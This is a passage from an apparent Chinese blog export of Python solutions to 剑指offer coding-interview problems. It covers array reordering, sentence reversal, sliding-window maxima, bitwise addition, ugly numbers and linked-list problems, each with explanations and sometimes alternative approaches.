<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reOrderArray</span><span class="params">(self, array)</span>:</span></div><div class="line">        odd = []</div><div class="line">        even = []</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> array:</div><div class="line">            <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</div><div class="line">                even.append(i)</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                odd.append(i)</div><div class="line">        odd.extend(even)</div><div class="line">        <span class="keyword">return</span> odd</div></pre></td></tr></table></figure>
<h5 id="题解-2-1"><a href="#题解-2-1" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　考虑用双指针。第一个指针初始化时指向数组的第一个数字，它只向后移动；第二个指针初始化时指向数组的最后一个数字，它指向前移动。如果第一个指针的数字是偶数，并且第二个指针指向的数字是奇数，就交换两个数字。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reOrderArray</span><span class="params">(self, array)</span>:</span></div><div class="line">        left = <span class="number">0</span></div><div class="line">        right = len(array) - <span class="number">1</span></div><div class="line">        <span class="keyword">while</span> left &lt;= right:</div><div class="line">            <span class="keyword">while</span> array[left] % <span class="number">2</span> != <span class="number">0</span>:</div><div class="line">                left += <span class="number">1</span></div><div class="line">            <span class="keyword">while</span> array[right] % <span class="number">2</span> != <span class="number">1</span>:</div><div class="line">                right -= <span class="number">1</span></div><div class="line">            <span class="keyword">if</span> left &lt; right:</div><div class="line">                array[left], array[right] = array[right], array[left]</div><div class="line">        <span class="keyword">return</span> array</div></pre></td></tr></table></figure>
<p>　　<strong>注意，题目要求保证奇数和奇数，偶数和偶数之间的相对位置不变。</strong></p>
<p>　　同样采用双指针，第一个指针 left 从左向右遍历，找到第一个偶数，第二个指针 right 从 left+1 开始向后找，直到找到第一个奇数。然后，将 [left,…,right-1] 的元素整体后移一位，最后将找到的奇数放入 left 的位置，并且第一个指针继续向后进行下一次查找。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reOrderArray</span><span class="params">(self, array)</span>:</span></div><div class="line">        left = <span class="number">0</span></div><div class="line">        length = len(array)</div><div class="line">        <span class="keyword">while</span> left &lt; length:</div><div class="line">            <span class="keyword">while</span> left &lt; length <span class="keyword">and</span> array[left] % <span class="number">2</span> != <span class="number">0</span>:</div><div class="line">                left += <span class="number">1</span></div><div class="line">            right = left + <span class="number">1</span></div><div class="line">            <span class="keyword">while</span> right &lt; length <span class="keyword">and</span> array[right] % <span class="number">2</span> != <span class="number">1</span>:</div><div class="line">                right += <span class="number">1</span></div><div class="line">            <span class="keyword">if</span> right &lt; length:</div><div class="line">                tmp = array[right]</div><div class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(right - <span class="number">1</span>, left - <span class="number">1</span>, <span class="number">-1</span>):</div><div class="line">                    array[i + <span class="number">1</span>] = array[i]</div><div class="line">                array[left] = tmp</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">break</span></div><div class="line"></div><div class="line">        <span class="keyword">return</span> array</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Algorithm</tag>
        <tag>剑指offer</tag>
      </tags>
  </entry>
  <entry>
    <title>剑指offer-栈和队列(下)</title>
    <url>/2019/08/28/%E5%89%91%E6%8C%87offer-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97-%E4%B8%8B/</url>
    <content><![CDATA[<p><center>秋招，来了！</center><br><a id="more"></a></p>
<h4 id="翻转单词顺序列"><a href="#翻转单词顺序列" class="headerlink" title="翻转单词顺序列"></a>翻转单词顺序列</h4><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　牛客最近来了一个新员工Fish，每天早晨总是会拿着一本英文杂志，写些句子在本子上。同事Cat对Fish写的内容颇感兴趣，有一天他向Fish借来翻看，但却读不懂它的意思。例如，“student. a am I”。后来才意识到，这家伙原来把句子单词的顺序翻转了，正确的句子应该是“I am a student.”。Cat对一一的翻转这些单词顺序可不在行，你能帮助他么？</p>
<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　把字符串按照空格切分成字符串列表，然后将列表反转，再使用 join 方法组合成新的字符串即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ReverseSentence</span><span class="params">(self, s)</span>:</span></div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s:</div><div class="line">            <span class="keyword">return</span> <span class="string">""</span></div><div class="line">        src = s.strip().split()</div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> src:</div><div class="line">            <span class="keyword">return</span> s</div><div class="line">        src.reverse()</div><div class="line">        <span class="keyword">return</span> <span class="string">" "</span>.join(src)</div></pre></td></tr></table></figure>
<h5 id="题解-2"><a href="#题解-2" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　利用栈，把字符串按照空格切分成字符串列表，把列表当作栈，然后依次弹出最后一个元素。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ReverseSentence</span><span class="params">(self, s)</span>:</span></div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s:</div><div class="line">            <span class="keyword">return</span> <span class="string">""</span></div><div class="line">        stack = []</div><div class="line">        stack = s.strip().split()</div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> stack:</div><div class="line">            <span class="keyword">return</span> s</div><div class="line">        result = <span class="string">""</span></div><div class="line">        <span class="keyword">while</span> stack:</div><div class="line">            result += stack.pop()</div><div class="line">            result += <span class="string">" "</span></div><div class="line">        <span class="keyword">return</span> result.strip()</div></pre></td></tr></table></figure>
<p>　　需要特别注意全是空格的字符串。</p>
<h4 id="滑动窗口的最大值"><a href="#滑动窗口的最大值" class="headerlink" title="滑动窗口的最大值"></a>滑动窗口的最大值</h4><h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　给定一个数组和滑动窗口的大小，找出所有滑动窗口里数值的最大值。例如，如果输入数组{2,3,4,2,6,2,5,1}及滑动窗口的大小3，那么一共存在6个滑动窗口，他们的最大值分别为{4,4,6,6,6,5}； 针对数组{2,3,4,2,6,2,5,1}的滑动窗口有以下6个： {[2,3,4],2,6,2,5,1}， {2,[3,4,2],6,2,5,1}， {2,3,[4,2,6],2,5,1}， {2,3,4,[2,6,2],5,1}， {2,3,4,2,[6,2,5],1}， {2,3,4,2,6,[2,5,1]}。</p>
<h5 id="题解-1-1"><a href="#题解-1-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　暴力法。通过切片得到每个窗口内的元素，然后使用内置函数 max 求每个窗口内的最大值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxInWindows</span><span class="params">(self, num, size)</span>:</span></div><div class="line">        max_value = []</div><div class="line">        <span class="keyword">if</span> num <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> size == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> max_value</div><div class="line">        <span class="keyword">if</span> size == <span class="number">1</span>:</div><div class="line">            <span class="keyword">return</span> num</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(num) - size + <span class="number">1</span>):</div><div class="line">            max_value.append(max(num[i:i + size]))</div><div class="line">        <span class="keyword">return</span> max_value</div></pre></td></tr></table></figure>
<h5 id="题解-2-1"><a href="#题解-2-1" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　使用双端队列，即可以在队列的两端实现插入和删除操作。让队列的队首元素始终是当前窗口的最大值的索引，且队列的长度始终小于等于 size。在这个队列中，从两端删除元素：</p>
<ul>
<li>从队首删除元素：因为长度超了，必须删掉当前最左的元素。</li>
<li>从队尾删除元素：把队列中比新元素小的元素的下标弹出，保证队列队头是窗口元素值最大的下标。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxInWindows</span><span class="params">(self, num, size)</span>:</span></div><div class="line">        <span class="comment"># write code here</span></div><div class="line">        max_value = []</div><div class="line">        <span class="keyword">if</span> num <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> size == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> max_value</div><div class="line">        deque = []</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(num)):</div><div class="line">            <span class="keyword">while</span> deque <span class="keyword">and</span> num[i] &gt;= num[deque[<span class="number">-1</span>]]:  <span class="comment"># 弹出队列中比新元素小的元素的下标</span></div><div class="line">                deque.pop()</div><div class="line">            deque.append(i)</div><div class="line">            <span class="keyword">if</span> i - deque[<span class="number">0</span>] + <span class="number">1</span> &gt; size:  <span class="comment"># 超过最大长度</span></div><div class="line">                deque.pop(<span class="number">0</span>)</div><div class="line">            <span class="keyword">if</span> i + <span class="number">1</span> &gt;= size:  <span class="comment"># 保存当前最大值</span></div><div class="line">                max_value.append(num[deque[<span class="number">0</span>]])</div><div class="line">        <span class="keyword">return</span> max_value</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Algorithm</tag>
        <tag>剑指offer</tag>
      </tags>
  </entry>
  <entry>
    <title>剑指offer-数学</title>
    <url>/2019/08/17/%E5%89%91%E6%8C%87offer-%E6%95%B0%E5%AD%A6/</url>
    <content><![CDATA[<p><center>秋招，来了！</center><br><a id="more"></a></p>
<h4 id="求1-2-3-…-n"><a href="#求1-2-3-…-n" class="headerlink" title="求1+2+3+…+n"></a>求1+2+3+…+n</h4><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　求1+2+3+…+n，要求不能使用乘除法、for、while、if、else、switch、case等关键字及条件判断语句（A?B:C）。</p>
<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　使用递归，利用逻辑与的短路特性实现递归终止。使用and 运算符时，前一项为假则整个表达式为假，即 <code>A and B</code>，如果 A 为 false 则不会计算 B。 因此可以利用这个性质进行递归运算达到累加的目的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Sum_Solution</span><span class="params">(self, n)</span>:</span></div><div class="line">        <span class="keyword">return</span> n <span class="keyword">and</span> n + self.Sum_Solution(n - <span class="number">1</span>)</div></pre></td></tr></table></figure>
<h5 id="题解-2"><a href="#题解-2" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　使用 reduce() 函数，它会对参数序列中元素进行累积。函数将一个数据集合（链表，元组等）中的所有数据进行下列操作：用传给 reduce 中的函数 function（有两个参数）先对集合中的第 1、2 个元素进行操作，得到的结果再与第三个数据用 function 函数运算，最后得到一个结果。</p>
<p>　　reduce() 函数语法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">reduce(function, iterable[, initializer])</div></pre></td></tr></table></figure>
<ul>
<li>function – 函数，有两个参数</li>
<li>iterable – 可迭代对象</li>
<li>initializer – 可选，初始参数</li>
</ul>
<p>　　注意：在 Python3 中如果使用 reduce 需要先导入 <code>from functools import reduce</code> 。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Sum_Solution</span><span class="params">(self, n)</span>:</span></div><div class="line">        <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x+y, range(<span class="number">1</span>,n+<span class="number">1</span>))</div></pre></td></tr></table></figure>
<h4 id="不用加减乘除做加法"><a href="#不用加减乘除做加法" class="headerlink" title="不用加减乘除做加法"></a>不用加减乘除做加法</h4><h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　写一个函数，求两个整数之和，要求在函数体内不得使用+、-、*、/四则运算符号。</p>
<h5 id="题解-1-1"><a href="#题解-1-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>​    通过自增自减来实现（依然用到了加法，好像不太符合题目要求）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(self, num1, num2)</span>:</span></div><div class="line">        <span class="keyword">if</span> num1 &lt; <span class="number">0</span>:</div><div class="line">            <span class="keyword">while</span> num1:</div><div class="line">                num1 += <span class="number">1</span></div><div class="line">                num2 -= <span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">while</span> num1:</div><div class="line">                num1 -= <span class="number">1</span></div><div class="line">                num2 += <span class="number">1</span></div><div class="line">        <span class="keyword">return</span> num2</div></pre></td></tr></table></figure>
<h5 id="题解-2-1"><a href="#题解-2-1" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　使用位运算解题：</p>
<ul>
<li>两个数异或：相当于每一位相加，而不考虑进位；</li>
<li>两个数相与，并左移一位：相当于求得进位；</li>
<li>将上述两步的结果相加。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">比如：5+7，注：5=101，7=111，</div><div class="line">1. 不考虑进位值，进行异或，101^111=010</div><div class="line">2. 计算进位值，先进行与，101&amp;111=101，再左移一位，得到1010</div><div class="line">3. 重复1，2</div><div class="line"></div><div class="line">1. 不考虑进位值，进行异或，0010^1010=1000</div><div class="line">2. 计算进位值，先进行与，0010&amp;1010=0010，再左移一位，得到00100</div><div class="line">3. 重复1，2 </div><div class="line"></div><div class="line">1. 不考虑进位值，进行异或，01000^00100=01100</div><div class="line">2. 计算进位值，先进行与，01000&amp;00100=0，左移之后还是0</div><div class="line">3. 此时，进位值为0，所以计算可以终止，最终结果为01100，即12</div></pre></td></tr></table></figure>
<p>　　代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(self, num1, num2)</span>:</span></div><div class="line">        <span class="keyword">while</span> num2:</div><div class="line">            result = num1^num2</div><div class="line">            num2 = (num1 &amp; num2) &lt;&lt; <span class="number">1</span></div><div class="line">            num1 = result</div><div class="line">        <span class="keyword">return</span> num1</div></pre></td></tr></table></figure>
<p>　　提交后，发现超时。自己测试发现当一个整数和一个负数相加时出现了死循环，问题出在 <code>result= num1^num2</code> 。实际上，在进行负数的按位加法时，有可能发生在最高位还要向前进一位的情形，正常来说，这种进位因为超出了一个int可以表示的最大位数，应该舍去才能得到正确的结果。</p>
<p>　　在早期版本中如 Python2.7 中，整数的有 int 和 long 两个类型。int类型是一个固定位数的数；long 则是一个理论上可以存储无限大数的数据类型。当数大到可能溢出时，为了避免溢出，Python 会把 int 转化为 long。而Python3.x 之后整数只有一个可以放任意大数的 int 了。可是无论哪种，都是采用了特殊的方法实现了不会溢出的大整数。 所以会使程序无限的算下去，这也是 Python 效率低的一个原因。</p>
<p>　　修改代码，每次都把 num1 规定成一个 32 位的数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(self, num1, num2)</span>:</span></div><div class="line">        <span class="keyword">while</span> num2:</div><div class="line">            result = num1^num2</div><div class="line">            num2 = (num1 &amp; num2) &lt;&lt; <span class="number">1</span></div><div class="line">            num1 = result &amp; <span class="number">0xFFFFFFFF</span></div><div class="line">        <span class="keyword">return</span> num1 <span class="keyword">if</span> num1 &gt;&gt; <span class="number">31</span> == <span class="number">0</span> <span class="keyword">else</span> num1 - <span class="number">4294967296</span></div></pre></td></tr></table></figure>
<h4 id="丑数"><a href="#丑数" class="headerlink" title="丑数"></a>丑数</h4><h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　把只包含质因子2、3和5的数称作丑数（Ugly Number）。例如6、8都是丑数，但14不是，因为它包含质因子7。 习惯上我们把1当做是第一个丑数。求按从小到大的顺序的第N个丑数。</p>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><p>　　遍历法效率太低，会超时。因此，我们将查找的丑数按从小到大的顺序排好序，注意每个丑数必为前面的丑数乘以 2、3 或 5 得到的；把现有最大丑数记为 M，则把第一个乘以 2 后大于 M 的结果记为 M2，同理，把每个丑数乘以 3 和 5 ，得到的第一个大于 M 的结果为 M3 和 M5，那么下一个丑数必为 M2/M3/M5 这三个数的最小者。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetUglyNumber_Solution</span><span class="params">(self, index)</span>:</span></div><div class="line">        <span class="keyword">if</span> index == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span></div><div class="line">        cnt = <span class="number">1</span></div><div class="line">        min2 = min3 = min5 = <span class="number">0</span></div><div class="line">        base = [<span class="number">1</span>]</div><div class="line">        <span class="keyword">while</span> cnt &lt; index:</div><div class="line">            min_num = min(base[min2]*<span class="number">2</span>, base[min3]*<span class="number">3</span>, base[min5]*<span class="number">5</span>)</div><div class="line">            base.append(min_num)</div><div class="line">            <span class="comment"># 找到第一个乘以2的结果等于当前最大丑数min_num的数字</span></div><div class="line">            <span class="keyword">if</span> min_num == base[min2]*<span class="number">2</span>:</div><div class="line">                min2 += <span class="number">1</span></div><div class="line">            <span class="comment"># 找到第一个乘以3的结果大于当前最大丑数min_num的数字</span></div><div class="line">            <span class="keyword">if</span> min_num == base[min3]*<span class="number">3</span>:</div><div class="line">                min3 += <span class="number">1</span></div><div class="line">            <span class="comment"># 找到第一个乘以5的结果大于当前最大丑数min_num的数字</span></div><div class="line">            <span class="keyword">if</span> min_num == base[min5]*<span class="number">5</span>:</div><div class="line">                min5 += <span class="number">1</span></div><div class="line">            cnt += <span class="number">1</span></div><div class="line">        <span class="keyword">return</span> base[cnt<span class="number">-1</span>]</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Algorithm</tag>
        <tag>剑指offer</tag>
      </tags>
  </entry>
  <entry>
    <title>剑指offer-链表(下)</title>
    <url>/2019/08/16/%E5%89%91%E6%8C%87offer-%E9%93%BE%E8%A1%A8-%E4%B8%8B/</url>
    <content><![CDATA[<center>秋招，来了！</center>

<a id="more"></a>
<h4 id="链表中环的入口结点"><a href="#链表中环的入口结点" class="headerlink" title="链表中环的入口结点"></a>链表中环的入口结点</h4><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　给一个链表，若其中包含环，请找出该链表的环的入口结点，否则，输出null。</p>
<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　使用快慢指针。快指针每次走两步，慢指针每次走一步。当两个指针相遇时，再让慢指针从头开始，两个指针都开始走，每次走一步，再次相遇时就是环的入口节点。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># Definition for singly-linked list.</span></div><div class="line"><span class="comment"># class ListNode(object):</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.next = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">entryNodeOfLoop</span><span class="params">(self, head)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type head: ListNode</div><div class="line">        :rtype: ListNode</div><div class="line">        """</div><div class="line">        <span class="keyword">if</span> head <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line"></div><div class="line">        fast = head</div><div class="line">        slow = head</div><div class="line">        <span class="keyword">while</span> fast <span class="keyword">and</span> fast.next:</div><div class="line">            fast = fast.next.next  <span class="comment"># 快指针走两步</span></div><div class="line">            slow = slow.next  <span class="comment"># 慢指针走一步</span></div><div class="line">            <span class="keyword">if</span> fast == slow:  <span class="comment"># 快慢指针相遇</span></div><div class="line">                slow = head  <span class="comment"># 慢指针从头开始</span></div><div class="line">                <span class="keyword">while</span> fast != slow:  <span class="comment"># 快慢指针一起走，每次走一步</span></div><div class="line">                    fast = fast.next</div><div class="line">                    slow = slow.next</div><div class="line">                <span class="keyword">return</span> fast</div><div class="line"></div><div class="line">        <span class="keyword">return</span> <span class="keyword">None</span></div></pre></td></tr></table></figure>
<h5 id="题解-2"><a href="#题解-2" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　遍历链表，用一个列表记录节点值，如果当前节点的值已经存在于记录列表中，则直接返回当前节点。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># Definition for singly-linked list.</span></div><div class="line"><span class="comment"># class ListNode(object):</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.next = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">entryNodeOfLoop</span><span class="params">(self, head)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type head: ListNode</div><div class="line">        :rtype: ListNode</div><div class="line">        """</div><div class="line">        <span class="keyword">if</span> head <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">        records = []</div><div class="line">        <span class="keyword">while</span> head:</div><div class="line">            <span class="keyword">if</span> head.val <span class="keyword">in</span> records:</div><div class="line">                <span class="keyword">return</span> head</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                records.append(head.val)</div><div class="line">            head = head.next</div></pre></td></tr></table></figure>
<h4 id="复杂链表的复制"><a href="#复杂链表的复制" class="headerlink" title="复杂链表的复制"></a>复杂链表的复制</h4><h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　输入一个复杂链表（每个节点中有节点值，以及两个指针，一个指向下一个节点，另一个特殊指针指向任意一个节点），返回结果为复制后复杂链表的 head。（注意，输出结果中请不要返回参数中的节点引用，否则判题程序会直接返回空）</p>
<h5 id="题解-1-1"><a href="#题解-1-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　这个题目的关键在于 random 指针的处理，如果遍历链表一个个节点复制，那么当前节点的random指针指向的节点在复制的链表中可能还不存在。所以，需要用一个字典来保存每个节点及其对应的克隆节点的地址，这样就可以通过查询这个哈希表在 O(1) 的时间内找到 random 指针所指向的节点。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class RandomListNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.label = x</span></div><div class="line"><span class="comment">#         self.next = None</span></div><div class="line"><span class="comment">#         self.random = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 返回 RandomListNode</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Clone</span><span class="params">(self, pHead)</span>:</span></div><div class="line">        <span class="comment"># write code here</span></div><div class="line">        <span class="keyword">if</span> pHead <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> pHead</div><div class="line"></div><div class="line">        records = &#123;&#125;</div><div class="line">        copy_head = RandomListNode(pHead.label)</div><div class="line">        copy = copy_head</div><div class="line">        head = pHead.next</div><div class="line"></div><div class="line">        <span class="keyword">while</span> head:  <span class="comment"># 将原始链表复制出来，先忽略random指针，但是保存原始节点和复制节点的地址</span></div><div class="line">            copy.next = RandomListNode(head.label)</div><div class="line">            copy = copy.next</div><div class="line">            records[id(head)] = copy</div><div class="line">            head = head.next</div><div class="line"></div><div class="line">        head = pHead</div><div class="line">        copy = copy_head</div><div class="line">        <span class="keyword">while</span> head:  <span class="comment"># 处理random指针</span></div><div class="line">            <span class="keyword">if</span> head.random:</div><div class="line">                copy.random = records[id(head.random)]</div><div class="line">            copy = copy.next</div><div class="line">            head = head.next</div><div class="line"></div><div class="line">        <span class="keyword">return</span> copy_head</div></pre></td></tr></table></figure>
<h5 id="题解-2-1"><a href="#题解-2-1" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　也可以不使用字典，拆成三步来处理：</p>
<ul>
<li><p>遍历链表，复制每个结点，如复制结点 src 得到 copy，将结点 copy 插到结点 src 后面；</p>
</li>
<li><p>重新遍历链表，复制老结点的随机指针给新结点，如 src.random = copy.random.next;</p>
</li>
<li><p>拆分链表，将链表拆分为原链表和复制后的链表。</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class RandomListNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.label = x</span></div><div class="line"><span class="comment">#         self.next = None</span></div><div class="line"><span class="comment">#         self.random = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 返回 RandomListNode</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Clone</span><span class="params">(self, pHead)</span>:</span></div><div class="line">        <span class="comment"># write code here</span></div><div class="line">        <span class="keyword">if</span> pHead <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> pHead</div><div class="line">        head = pHead</div><div class="line">        <span class="keyword">while</span> head:  <span class="comment"># 复制每个节点</span></div><div class="line">            copy = RandomListNode(head.label)</div><div class="line">            copy.next = head.next</div><div class="line">            head.next = copy</div><div class="line">            head = copy.next</div><div class="line"></div><div class="line">        head = pHead</div><div class="line">        <span class="keyword">while</span> head:  <span class="comment"># 处理random指针</span></div><div class="line">            copy = head.next</div><div class="line">            <span class="keyword">if</span> head.random:</div><div class="line">                copy.random = head.random.next</div><div class="line">            head = copy.next</div><div class="line"></div><div class="line">        cur, copy_head = pHead, pHead.next</div><div class="line">        <span class="keyword">while</span> cur:  <span class="comment"># 拆分链表</span></div><div class="line">            copy = cur.next</div><div class="line">            cur.next = copy.next</div><div class="line">            <span class="keyword">if</span> copy.next:</div><div class="line">                copy.next = cur.next.next</div><div class="line">            cur = cur.next</div><div class="line">        <span class="keyword">return</span> copy_head</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Algorithm</tag>
        <tag>剑指offer</tag>
      </tags>
  </entry>
  <entry>
    <title>剑指offer-链表(中)</title>
    <url>/2019/08/10/%E5%89%91%E6%8C%87offer-%E9%93%BE%E8%A1%A8-%E4%B8%AD/</url>
    <content><![CDATA[<p><center>秋招，来了！</center><br><a id="more"></a></p>
<h4 id="两个链表的第一个公共结点"><a href="#两个链表的第一个公共结点" class="headerlink" title="两个链表的第一个公共结点"></a>两个链表的第一个公共结点</h4><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　输入两个链表，找出它们的第一个公共结点。</p>
